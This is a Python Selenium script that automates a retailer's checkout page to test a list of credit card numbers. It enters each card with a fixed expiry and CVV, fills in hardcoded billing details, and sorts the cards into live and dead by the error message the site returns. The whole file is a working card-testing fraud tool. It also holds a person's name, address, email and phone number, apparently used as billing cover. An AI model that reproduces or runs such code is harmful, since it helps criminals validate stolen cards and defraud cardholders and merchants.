from selenium import webdriver
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.keys import Keys
import logging
from selenium.webdriver.remote.remote_connection import LOGGER
LOGGER.setLevel(logging.WARNING)
import lxml
import os
import time
import csv
CRED = ''
CYEL = ''
CEND = ''
input_file = "list.txt"
output_file = "new_list.txt"
first = "Richard"
last = "Vaicekauskas"
city = "Calgary"
state = "Alberta"
zip = "T2V 2W2"
city = "Calgary"
address = "Calgary"
email = "ddsqwe@gmail.com"
phone = "606-703-2563"

from configparser import ConfigParser
config_object = ConfigParser()
def init():
      global input_file,output_file,first,last,city,state,zip,city,address,email,phone
      config = None
      try:
            config_object.read("config.ini")
            config = config_object["APPLICATION_CONFIG"]
      except Exception as err:
            print("Cannot read config.ini "+ str(err))
            return False
      try:
            input_file = config["input_file"]
            output_file = config["output_file"]
            first = config["first"]
            last = config["last"]
            city = config["city"]
            state = config["state"]
            zip = config["zip"]
            city = config["city"]
            address = config["address"]
            email = config["email"]
            phone = config["phone"]
            output_file = config["output_file"]
            print(input_file)
            print(output_file)
            return True
      except Exception as err:
            return False
def writeReport(filename, log):
    with open(filename, mode='a') as report:
        report.write(log+"\n")
webDriver = None
options = webdriver.ChromeOptions()
options.add_argument("--disable-crash-reporter");
options.add_argument("--disable-extensions");
options.add_argument("--disable-in-process-stack-traces");
options.add_argument("--disable-logging");
options.add_argument("--disable-dev-shm-usage");
# options.add_argument(
#     "user-data-dir=C:\\Users\USER\\AppData\\Local\Google\\Chrome\\User Data")

URL = 'https://www.jockey.com/catalog/product/jockey-womens-lace-bralette?color=4954'
def getList():
      global input_file
      global output_file
      output_file = "list_"+ str(int(time.time()))+".txt"
      print(CYEL+"FILE OUT : "+output_file+CYEL)
      with open(output_file, mode='w') as f:
            pass
      with open(input_file) as f:
            content = f.readlines()
            content = [x.strip() for x in content]
            return content
def WriteResult(cc, status):
      global output_file
      with open(output_file, mode='a') as f:
            f.write(cc+" : " +status+"\n")
def check_one_cc(cc):
      try:
            global webDriver
            date = '02/22'
            cvv = '333'
            webDriver.find_element_by_xpath(
            "//input[@name='cardnumber']").send_keys(Keys.CONTROL, 'a', Keys.BACKSPACE)
            webDriver.find_element_by_xpath(
            "//input[@name='ExpirationDate']").send_keys(Keys.CONTROL, 'a', Keys.BACKSPACE)
            webDriver.find_element_by_xpath(
            "//input[@name='ValidationCode']").send_keys(Keys.CONTROL, 'a', Keys.BACKSPACE)
            webDriver.find_element_by_xpath(
            "//input[@name='cardnumber']").send_keys(cc)
            webDriver.find_element_by_xpath(
            "//input[@name='ExpirationDate']").send_keys(date)
            webDriver.find_element_by_xpath(
            "//input[@name='ValidationCode']").send_keys(cvv)
            webDriver.execute_script("$(`.no-mt.nextstep-btn`)[1].click();")
            time.sleep(3)
            data_src = BeautifulSoup(webDriver.page_source, features="lxml")
            btnAdd = None
            status_div = None
            isSV = False
            tryit = 0
            while (isSV == False or tryit < 10):
                  try:
                        
                        data_src = BeautifulSoup(
                        webDriver.page_source, features="lxml")
                        status_div = webDriver.find_element_by_xpath("//div[@id='checkout-error-toast']")
                        time.sleep(1)
                        status_div = webDriver.find_element_by_xpath("//div[@id='checkout-error-toast']")
                        btnAdd= data_src.find_all('button', {'class', 'no-mt nextstep-btn'})
                        if (len(btnAdd)<2):
                              isSv = False
                        else:
                              btnAddCheck = btnAdd[1]
                              if (btnAddCheck.get_text() != 'Continue to Order Review'):
                                    isSV = False
                        isSV = True
                        print("TRUE")
                        break;
                  except:
                        print("CANNOT FOUND STATUS - RETRY")
                        isSV = False
                  print("TRYING" + str(tryit))
                  tryit += 1
                  time.sleep(2)
                  if (tryit > 5):
                        return False
            # 
            status = 'D'
            # print(CYEL+status_div)
            textt = status_div.text
            if (textt == 'Credit Card Address Validation Failure'):
                  status = 'L'
            if (textt == "" or textt == "<p></p>"):
                  print(CYEL+"F5 : "+cc + "-" + textt+":"+CYEL)
                  return False
            WriteResult(cc, status)
            print(CYEL+"Success : "+cc + "-" + textt+":"+status+CYEL)
            return True
      except Exception as err:
            print("ERRO" + str(err))
            return False
def run(list_cc):
      global webDriver
      webDriver.get(URL)
      while ("/block.html" in webDriver.current_url):
            time.sleep(1)
            print(CYEL+"Please enter capchar"+CYEL)
            a = input()
            webDriver.get(URL)
      resp = webDriver.execute_script(
            "$(`.options button[class='box']`)[0].click()")
      resp = webDriver.execute_script("$(`.addToBag`).click()")
      data_src = BeautifulSoup(webDriver.page_source, features="lxml")
      time.sleep(3)
      insert_text = data_src.find_all('div', {'class', 'items-added-message'})
      if (len(insert_text) == 0):
            isOk = False;
            for i in range(1, 4):
                  data_src = BeautifulSoup(
                      webDriver.page_source, features="lxml")
                  time.sleep(1)
                  insert_text = data_src.find_all(
                      'div', {'class', 'items-added-message'})
                  if len(insert_text) > 0:
                        isOk = True;
                        break;
                  else:
                        print(CYEL+"Cannot add to cart"+CYEL)
            if isOk != True:
                  return;
      insertText = insert_text[0].text.strip()
      if (insertText != "1 item has been added to your cart".strip()):
            return;
      pass
      resp = webDriver.execute_script("$(`.addToBag.arrow`).click()")
      checkout_btn = data_src.find_all('button', {'class', 'arrow'})
      while (len(checkout_btn) < 1):
            resp = webDriver.execute_script("location.reload();")
      resp = webDriver.execute_script("$(`button[class='arrow']`).click();")
      time.sleep(2)
      #
      first = "Richard"
      last = "Vaicekauskas"
      city = "Calgary"
      state = "Alberta"
      zip = "T2V2W2"
      city = "Calgary"
      address = "729 Justus Blvd"
      email = "ddsqwe@gmail.com"
      phone = "606-703-2563"
      Select(webDriver.find_element_by_xpath(
          "//select[@name='CountryRegionCode']")).select_by_value("CA")
      Select(webDriver.find_element_by_xpath(
          "//select[@name='StateProvinceCode']")).select_by_value("AB")
      #
      webDriver.find_element_by_xpath(
          "//input[@id='FirstName']").send_keys(Keys.CONTROL, 'a', Keys.BACKSPACE)
      webDriver.find_element_by_xpath(
          "//input[@id='FirstName']").send_keys(first)
      #
      webDriver.find_element_by_xpath(
          "//input[@id='LastName']").send_keys(Keys.CONTROL, 'a', Keys.BACKSPACE)
      webDriver.find_element_by_xpath(
          "//input[@id='LastName']").send_keys(last)
      #
      webDriver.find_element_by_xpath(
          "//input[@id='Line1']").send_keys(Keys.CONTROL, 'a', Keys.BACKSPACE)
      webDriver.find_element_by_xpath(
          "//input[@id='Line1']").send_keys(address)
      #
      webDriver.find_element_by_xpath(
          "//input[@id='City']").send_keys(Keys.CONTROL, 'a', Keys.BACKSPACE)
      webDriver.find_element_by_xpath("//input[@id='City']").send_keys(city)
      #
      webDriver.find_element_by_xpath(
          "//input[@id='ZipPostalCode']").send_keys(Keys.CONTROL, 'a', Keys.BACKSPACE)
      webDriver.find_element_by_xpath(
          "//input[@id='ZipPostalCode']").send_keys(zip)
      #
      webDriver.find_element_by_xpath(
          "//input[@id='Email']").send_keys(Keys.CONTROL, 'a', Keys.BACKSPACE)
      webDriver.find_element_by_xpath("//input[@id='Email']").send_keys(email)
      #
      webDriver.find_element_by_xpath("//input[@name='PhoneNumber']").send_keys(Keys.CONTROL, 'a',Keys.BACKSPACE)
      webDriver.find_element_by_xpath("//input[@name='PhoneNumber']").send_keys(phone)
      webDriver.execute_script("$(`.no-mt.nextstep-btn`)[0].click();")
      time.sleep(3)
      data_src = BeautifulSoup( webDriver.page_source, features="lxml")
      price_label = data_src.find_all('div', {'class', 'usdBanner'})
      tryit = 0
      while(tryit < 10 and len(price_label)==0):
            data_src = BeautifulSoup( webDriver.page_source, features="lxml")
            price_label = data_src.find_all('div', {'class', 'usdBanner'})
            time.sleep(2)
            tryit +=1
            if (tryit > 10):
                  print(CYEL+"Cannot add card"+CYEL)
                  return;
      # RUN LOOP CARD NUMBER
      index = 0
      total = len(list_cc)
      print("TOTAL : "+ str(total))
      for cc in list_cc:
            print(CYEL+str(index+1)+" --> " +cc+CYEL)
            tryit = 0
            a = check_one_cc(cc)
            if  a== False:
                  webDriver.execute_script("location.reload();")
                  check_one_cc(cc)
            index+=1
isInit = init()
if (isInit):
      webDriver = webdriver.Chrome(
    'chromedriver91.exe', options=options)
      list_cc = getList()
      print(list_cc)
      # list_cc = ['4355460506785640']
      try:
            run(list_cc)
      except Exception as errr:
            print(CYEL+"BLOCKED, PLEASE RE RUN PROGRAM"+str(errr))
